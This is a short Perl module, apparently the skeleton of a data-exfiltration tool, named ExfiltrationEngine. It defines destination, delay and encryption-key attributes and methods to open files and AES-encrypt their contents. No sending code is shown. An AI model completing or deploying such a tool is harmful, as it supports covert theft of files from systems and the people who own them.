#!/usr/bin/perl

package ExfiltrationEngine;

use Carp;
use Crypt::AES::CTR;
use File::stat;
use LWP::UserAgent;
use Moose;

use constant SIZE   =>  256;

has delay => (
    is  =>  'rw',
    isa =>  'Int'
);

has dest => (
    is  =>  'rw',
    isa =>  'Str'
);

has file => (
    is  =>  'rw'
);

has size => (
    is  =>  'rw',
    isa =>  'Int'
);

has encryptionKey => (
    is  =>  'rw',
    isa =>  'Str'
);

sub loadFile {
    my($self, $file) = @_;

    open $self->{file}, '<', $file or croak "File [$file] doesn't exist";
    binmode $self->file;

    return stat($file)->size;
}

sub closeFile {
    my $self = shift;

    close($self->file) or croak "File cannot be closed";

    return;
}

sub encrypt {
    my($self, $data) = @_;

    return Crypt::AES::CTR::encrypt($data, $self->encryptionKey, @{[ SIZE ]});
}

1;
